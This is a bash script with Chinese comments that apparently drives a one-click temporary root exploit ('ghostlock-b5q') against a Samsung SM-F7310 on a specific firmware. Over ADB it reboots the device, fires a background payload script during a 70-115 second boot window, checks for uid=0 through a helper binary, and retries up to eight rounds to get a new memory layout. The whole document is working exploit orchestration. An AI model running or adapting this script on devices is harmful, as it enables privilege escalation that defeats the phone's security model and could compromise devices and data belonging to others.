#!/bin/bash
# ghostlock-b5q 一键临时 root（SM-F7310 / F7310ZCS5DXJ2）
# 全自动：重启 → 开机 70-115s 黄金窗口发射 payload → 快速失败参数
#        → 28 分钟无果自动重启换内存布局（共 8 轮）→ root 即停
# 用法：bash scripts/fast_root.sh [adb 路径]
export MSYS_NO_PATHCONV=1
ADB="${1:-adb}"
DEV=/data/local/tmp/f731

for round in $(seq 1 8); do
  echo "=== ROUND $round $(date +%H:%M:%S) ==="
  "$ADB" reboot 2>/dev/null
  sleep 8
  for i in $(seq 1 60); do "$ADB" get-state 2>/dev/null | grep -q device || break; sleep 2; done
  "$ADB" wait-for-device 2>/dev/null
  hit=0; up=0
  for i in $(seq 1 300); do
    up=$("$ADB" shell "cat /proc/uptime" 2>/dev/null | cut -d. -f1 | tr -d '\r\n ')
    b=$("$ADB" shell "getprop sys.boot_completed" 2>/dev/null | tr -d '\r\n ')
    if [ -n "$up" ] && [ "$up" -ge 70 ] && [ "$up" -le 115 ] 2>/dev/null && [ "$b" = "1" ]; then hit=1; break; fi
    [ -n "$up" ] && [ "$up" -gt 150 ] 2>/dev/null && break
    sleep 2
  done
  if [ "$hit" = "1" ]; then
    "$ADB" shell "cd $DEV && setsid nohup sh root_capture_fast.sh >/dev/null 2>&1 &" 2>/dev/null
    echo "[*] fired at uptime=$up $(date +%H:%M:%S)"
  else
    echo "[-] missed window (uptime=${up:-?})"
  fi
  for i in $(seq 1 56); do
    if "$ADB" shell "$DEV/ksufd -- id 2>/dev/null" 2>/dev/null | grep -q "uid=0"; then
      echo "[+] ROOT LIVE at $(date +%H:%M:%S) (round $round)"; exit 0
    fi
    pass=$("$ADB" shell "grep -c 'LATE-LOAD PASS' $DEV/cap.log 2>/dev/null" 2>/dev/null | tr -d '\r\n ')
    [ "${pass:-0}" -ge 1 ] && { echo "[+] CAPTURE SUCCESS at $(date +%H:%M:%S)"; exit 0; }
    sleep 30
  done
  echo "[-] round $round: no root in 28min — reboot for fresh layout"
done
echo "[-] exhausted 8 rounds"
exit 1
